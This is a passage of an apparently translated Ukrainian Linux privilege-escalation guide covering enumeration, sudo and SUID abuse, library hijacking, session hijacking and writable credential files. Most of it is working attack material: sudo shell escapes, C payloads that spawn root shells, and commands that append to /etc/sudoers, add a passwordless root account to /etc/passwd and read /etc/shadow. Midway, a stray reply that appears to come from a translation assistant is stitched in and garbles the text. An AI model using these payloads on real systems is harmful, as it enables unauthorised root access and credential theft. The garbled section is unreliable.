Приклад такої політики в `/etc/dbus-1/system.d/wpa_supplicant.conf` наведено нижче, що деталізує дозволи для користувача root на володіння, надсилання та отримання повідомлень від `fi.w1.wpa_supplicant1`.

Політики без зазначеного користувача або групи застосовуються універсально, тоді як політики в контексті "default" застосовуються до всіх, хто не покритий іншими специфічними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як enumerate і exploit D-Bus communication тут:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво enumerate мережу та з'ясувати розташування машини.

### Загальне enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Завжди перевіряйте network services, які працюють на машині, з якими ви не могли взаємодіяти перед отриманням доступу до неї:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Перевірте, чи можете ви sniff traffic. Якщо так, ви зможете grab some credentials.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Перевірте **who** ви є, які у вас **privileges**, які **users** є в системах, хто може **login** і хто має **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Великий UID

Деякі версії Linux були уражені багом, який дозволяє користувачам з **UID > INT_MAX** підвищувати привілеї. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Експлуатувати** за допомогою: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи є ви **членом якоїсь групи**, яка може надати вам root-привілеї:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи є в буфері обміну щось цікаве (якщо можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** середовища, **спробуйте увійти під кожним користувачем**, використавши цей пароль.

### Su Brute

Якщо вас не бентежить створення великого шуму та на комп'ютері присутні бінарні файли `su` і `timeout`, ви можете спробувати brute-force користувача за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається brute-force користувачів.

## Зловживання записуваним PATH

### $PATH

Якщо ви виявите, що можете **записувати у деяку папку з $PATH**, ви можете підняти привілеї, **створивши backdoor у записуваній папці** з ім'ям певної команди, яка буде виконана іншим користувачем (ідеально — root), і яка **не завантажується з папки, що розташована перед** вашою записуваною папкою в $PATH.

### SUDO and SUID

Вам може бути дозволено виконувати деяку команду через sudo або вони можуть мати suid біт. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дозволяють читати та/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація Sudo може дозволити користувачу виконати певну команду з привілеями іншого користувача, не знаючи пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`; тепер отримати shell дуже просто — додавши ssh-ключ у директорію `root` або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачу **встановити змінну середовища** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **based on HTB machine Admirer**, був **vulnerable** до **PYTHONPATH hijacking**, що дозволяв завантажити довільну python бібліотеку під час виконання скрипта від імені root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV збережено через sudo env_keep → root shell

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), ви можете використати поведінку Bash при неінтерактивному запуску, щоб виконати довільний код від імені root при виклику дозволеної команди.

- Why it works: Для неінтерактивних shell-ів Bash оцінює `$BASH_ENV` і підвантажує (sources) цей файл перед виконанням цільового скрипта. Багато sudo правил дозволяють запускати скрипт або оболонкову обгортку. Якщо `BASH_ENV` збережено sudo, ваш файл підвантажується з привілеями root.

- Вимоги:
- Правило sudo, яке ви можете виконати (будь-яка ціль, що викликає `/bin/bash` неінтерактивно, або будь-який bash-скрипт).
- `BASH_ENV` присутній в `env_keep` (перевірте за допомогою `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Зміцнення безпеки:
- Видаліть `BASH_ENV` (та `ENV`) з `env_keep`, віддавайте перевагу `env_reset`.
- Уникайте shell-обгорток для команд, дозволених через sudo; використовуйте мінімальні бінарні файли.
- Розгляньте логування I/O sudo та сповіщення при використанні збережених env vars.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Якщо `sudo -l` показує `env_keep+=PATH` або `secure_path`, який містить записи, доступні для запису зловмисником (наприклад, `/home/<user>/bin`), будь-яку відносну команду всередині sudo-дозволеного цільового файла можна затінити.

- Вимоги: правило sudo (часто `NOPASSWD`), яке запускає скрипт/бінарник, що викликає команди без абсолютних шляхів (`free`, `df`, `ps` тощо), і наявний записуваний елемент PATH, який перевіряється першим.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo — обхід шляхів виконання
**Перейти** щоб прочитати інші файли або використати **symlinks**. Наприклад, у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це навіть простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary без вказання шляху до команди

Якщо користувачу надано **sudo permission** для однієї команди **без вказання шляху**: _hacker10 ALL= (root) less_ ви можете експлуатувати це, змінивши змінну PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ця техніка також може бути використана, якщо **suid** бінарний файл **виконує іншу команду без зазначення шляху до неї (завжди перевіряйте вміст дивного SUID бінарного файлу за допомогою** _**strings**_**)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID бінарний файл з вказаним шляхом до команди

Якщо **suid** бінарний файл **виконує іншу команду з вказаним шляхом**, тоді ви можете спробувати **export a function**, назвавши її так само, як команду, яку викликає suid файл.

Наприклад, якщо suid бінарний файл викликає _**/usr/sbin/service apache2 start**_, вам потрібно спробувати створити функцію та export її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Тоді, коли ви викличете suid binary, ця функція буде виконана

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна оточення **LD_PRELOAD** використовується для вказання однієї або кількох спільних бібліотек (.so файли), які завантажуються завантажувачем перед усіма іншими, включно зі стандартною бібліотекою C (`libc.so`). Цей процес відомий як передзавантаження бібліотеки.

Однак, щоб підтримувати безпеку системи й запобігти зловживанню цією можливістю, особливо для **suid/sgid** виконуваних файлів, система накладає певні обмеження:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, де real user ID (_ruid_) не збігається з effective user ID (_euid_).
- Для виконуваних файлів з **suid/sgid** передзавантажуються лише бібліотеки зі стандартних шляхів, які також мають **suid/sgid**.

Підвищення привілеїв може статися, якщо ви маєте можливість виконувати команди через `sudo` і вивід `sudo -l` містить запис **env_keep+=LD_PRELOAD**. Така конфігурація дозволяє змінній оточення **LD_PRELOAD** зберігатися й враховуватися навіть під час виконання команд через `sudo`, що може призвести до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Збережіть як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **compile it** using:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **escalate privileges** під час виконання
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Схожий privesc можна використати, якщо атакуючий контролює **LD_LIBRARY_PATH** env variable, бо він визначає шлях, у якому буде здійснюватися пошук бібліотек.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

При виявленні бінарного файлу з дозволами **SUID**, який виглядає підозріло, корисно перевірити, чи він правильно завантажує файли **.so**. Це можна зробити, виконавши наступну команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, зіткнення з помилкою, такою як _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_, вказує на потенційну можливість експлуатації.

Щоб експлуатувати це, потрібно створити C-файл, наприклад _"/path/to/.config/libcalc.c"_, що містить наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, призначений для підвищення привілеїв шляхом зміни дозволів файлів та запуску shell з підвищеними привілеями.

Скомпілюйте наведену вище C-програму в shared object (.so) файл за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск ураженого SUID binary має спровокувати exploit, що дозволить потенційне system compromise.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID binary, який завантажує бібліотеку з папки, в яку ми можемо записувати, створимо бібліотеку в цій папці з необхідною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримаєте помилку, таку як
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
це означає, що згенерована бібліотека має містити функцію з назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це кураторський список Unix binaries, які можуть бути використані атакуючим для обходу локальних обмежень безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — те саме, але для випадків, коли ви можете **лише інжектувати аргументи** в команду.

Проект збирає легітимні функції Unix binaries, які можуть бути зловживані для виходу з restricted shells, ескалації або підтримання elevated privileges, передачі файлів, створення bind і reverse shells та полегшення інших post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви можете виконати `sudo -l`, ви можете використати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), щоб перевірити, чи знаходить він спосіб експлуатувати будь-яке правило sudo.

### Reusing Sudo Tokens

У випадках, коли у вас є **sudo access**, але немає пароля, ви можете ескалувати привілеї, **чекаючи виконання sudo-команди і перехопивши session token**.

Вимоги для ескалації привілеїв:

- Ви вже маєте shell як користувач "_sampleuser_"
- "_sampleuser_" використав **`sudo`** для виконання чогось протягом **останніх 15 хвилин** (за замовчуванням це тривалість sudo token, яка дозволяє нам використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` має значення 0
- `gdb` доступний (ви можете завантажити його)

(Ви можете тимчасово включити `ptrace_scope` за допомогою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або постійно, відредагувавши `/etc/sysctl.d/10-ptrace.conf` і встановивши `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконані, **ви можете ескалувати привілеї, використовуючи:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **Другий exploit** (`exploit_v2.sh`) створить sh shell у _/tmp_, **який належить root і має setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **третій exploit** (`exploit_v3.sh`) **створить файл sudoers**, який зробить **sudo tokens вічними та дозволить усім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **write permissions** у папці або на будь-якому з файлів, створених у ній, ви можете скористатися бінарником [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) щоб **create a sudo token for a user and PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і у вас є shell від імені цього користувача з PID 1234, ви можете **obtain sudo privileges** без необхідності знати пароль, зробивши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. These files **by default can only be read by user root and group root**.\
Файл `/etc/sudoers` і файли в директорії `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. Ці файли **за замовчуванням можуть читатися лише користувачем root та групою root**.\
**Якщо** ви можете **read** цей файл, ви зможете **отримати деяку цікаву інформацію**, а якщо ви можете **write** будь-який файл — ви зможете **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо ви можете записувати, ви можете зловживати цим дозволом.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Інший спосіб зловживати цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Є деякі альтернативи бінарному файлу `sudo`, такі як `doas` для OpenBSD, не забудьте перевірити його конфігурацію в `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини і використовує `sudo`** для підвищення привілеїв, і ви отримали shell у контексті цього користувача, ви можете **створити новий sudo виконуваний файл**, який виконуватиме ваш код як root, а потім команду користувача. Потім **змініть $PATH** у контексті користувача (наприклад, додавши новий шлях у .bash_profile), щоб коли користувач виконає sudo, виконається ваш sudo виконуваний файл.

Зауважте, що якщо користувач використовує інший shell (не bash), вам потрібно змінити інші файли, щоб додати новий шлях. Наприклад[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) модифікує `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Інший приклад можна знайти в [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустивши щось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільні бібліотеки

### ld.so

Файл `/etc/ld.so.conf` вказує **звідки завантажуються файли конфігурації**. Зазвичай цей файл містить такий рядок: `include /etc/ld.so.conf.d/*.conf`

Це означає, що будуть зчитані файли конфігурації з `/etc/ld.so.conf.d/*.conf`. Ці файли конфігурації **вказують на інші теки**, в яких будуть **шукатися** **бібліотеки**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — `/usr/local/lib`. **Це означає, що система буде шукати бібліотеки у `/usr/local/lib`**.

Якщо з якоїсь причини **користувач має права на запис** у будь-який із вказаних шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-який файл всередині `/etc/ld.so.conf.d/` або будь-яку теку, вказану в конфігураційному файлі `/etc/ld.so.conf.d/*.conf`, він може отримати підвищення привілеїв.\
Перегляньте **як експлуатувати цю помилку в конфігурації** на наступній сторінці:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Скопіювавши lib у `/var/tmp/flag15/`, воно буде використано програмою у цьому місці, як вказано у змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть зловмисну бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Можливості

Linux capabilities забезпечують **підмножину доступних привілеїв root для процесу**. Це фактично розбиває root **привілеї на менші та відособлені одиниці**. Кожній з цих одиниць можна окремо надавати процесам. Таким чином повний набір привілеїв зменшується, знижуючи ризики експлуатації.\
Прочитайте наступну сторінку, щоб **дізнатися більше про capabilities і як ними зловживати**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Права доступу до каталогів

У каталозі **біт "execute"** означає, що відповідний користувач може "**cd**" до теки.\
Біт **"read"** означає, що користувач може **перелічувати** **файли**, а біт **"write"** означає, що користувач може **видаляти** та **створювати** нові **файли**.

## ACLs

Списки контролю доступу (ACLs) представляють вторинний шар дискреційних дозволів, здатний **перевизначати традиційні ugo/rwx permissions**. Ці дозволи розширюють контроль доступу до файлу або директорії, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або членами групи. Такий рівень **деталізації забезпечує більш точне керування доступом**. Детальніше див. [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Дайте** користувачу "kali" права читання та запису над файлом:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з певними ACL у системі:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Відкриті shell сесії

У **старих версіях** ви можете **hijack** якусь **shell** сесію іншого користувача (**root**).\
У **новіших версіях** ви зможете **connect** лише до screen-сесій свого власного користувача. Однак ви можете знайти **цікаву інформацію всередині сесії**.

### screen sessions hijacking

**Список screen-сесій**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Це була проблема зі **старими версіями tmux**. Я не міг hijack сеанс tmux (v2.1), створений root, будучи непривілейованим користувачем.

**Перелічити сеанси tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Усі SSL та SSH ключі, згенеровані в системах на базі Debian (Ubuntu, Kubuntu тощо) між вереснем 2006 і 13 травня 2008 можуть бути уражені цим багом.\
Цей баг виникає під час створення нового ssh ключа в цих ОС, оскільки **було можливих лише 32,768 варіантів**. Це означає, що всі варіанти можна обчислити і **маючи ssh public key ви можете шукати відповідний private key**. Ви можете знайти обчислені варіанти тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Визначає, чи дозволена автентифікація паролем. За замовчуванням `no`.
- **PubkeyAuthentication:** Визначає, чи дозволена автентифікація за public key. За замовчуванням `yes`.
- **PermitEmptyPasswords**: Коли дозволена автентифікація паролем, вказує, чи сервер дозволяє вхід до облікових записів з порожніми рядками пароля. За замовчуванням `no`.

### PermitRootLogin

Визначає, чи може root входити через ssh, за замовчуванням `no`. Можливі значення:

- `yes`: root може увійти за допомогою пароля та private key
- `without-password` або `prohibit-password`: root може входити лише за допомогою private key
- `forced-commands-only`: root може входити тільки за допомогою private key і якщо вказані опції commands
- `no` : ні

### AuthorizedKeysFile

Визначає файли, які містять public keys, що можуть використовуватися для автентифікації користувача. Він може містити токени на кшталт `%h`, який буде замінений на домашній каталог. **Ви можете вказати абсолютні шляхи** (що починаються з `/`) або **відносні шляхи від домашнього каталогу користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дозволяє вам **use your local SSH keys instead of leaving keys** (without passphrases!) — тобто не залишати ключі на сервері. Таким чином ви зможете **jump** via ssh **to a host** і звідти **jump to another** host **using** the **key** розташований на вашому **initial host**.

Вам потрібно встановити цю опцію в `$HOME/.ssh.config`, наприклад так:
```
Host example.com
ForwardAgent yes
```
Зауважте, що якщо `Host` встановлено в `*`, то щоразу, коли користувач підключається до іншої машини, цей хост зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перевизначати** ці **опції** та дозволяти або забороняти цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволяти** або **забороняти** ssh-agent forwarding за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням — дозволено).

Якщо ви виявите, що Forward Agent налаштований в середовищі, прочитайте наступну сторінку, оскільки **ви можете зловживати цим для ескалації привілеїв**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` та файли в каталозі `/etc/profile.d/` — це **скрипти, що виконуються, коли користувач запускає нову оболонку**. Отже, якщо ви можете **записати або змінити будь-який із них, ви можете ескалувати привілеї**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдете який-небудь підозрілий профільний скрипт, перевірте його на **чутливі дані**.

### Файли Passwd/Shadow

Залежно від ОС файли `/etc/passwd` та `/etc/shadow` можуть мати інші назви або існувати їхні резервні копії. Тому рекомендовано **знайти всі ці файли** та **перевірити, чи їх можна прочитати**, щоб побачити **чи містять вони хеші**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Іноді у файлі `/etc/passwd` (або в еквівалентному) можна знайти **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd доступний для запису

Спочатку згенеруйте пароль за допомогою однієї з наступних команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Мені потрібен вміст файлу src/linux-hardening/privilege-escalation/README.md, щоб виконати переклад. Будь ласка, вставте сюди вміст файлу.

Якщо бажаєте, я згенерую сильний пароль і додам у перекладений файл блок з командами для створення користувача hacker (наприклад):
- sudo useradd -m -s /bin/bash hacker
- echo 'hacker:<(згенерований_пароль)>' | sudo chpasswd

Підтвердіть, чи вставляти пароль у відкритому вигляді в README, і надайте сам файл для перекладу.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використовувати команду `su` з `hacker:hacker`

Альтернативно, ви можете використати наведені нижче рядки, щоб додати фіктивного користувача без пароля.\
УВАГА: ви можете погіршити поточну безпеку машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: На BSD-платформах `/etc/passwd` розташований у `/etc/pwd.db` та `/etc/master.passwd`, також `/etc/shadow` перейменовано в `/etc/spwd.db`.

Варто перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в якийсь **файл конфігурації сервісу**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині працює сервер **tomcat** і ви можете **змінити файл конфігурації служби Tomcat у /etc/systemd/,** тоді ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш backdoor буде виконаний наступного разу, коли tomcat буде запущено.

### Перевірте папки

Наступні папки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Можливо, ви не зможете прочитати останню папку, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивні місця/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
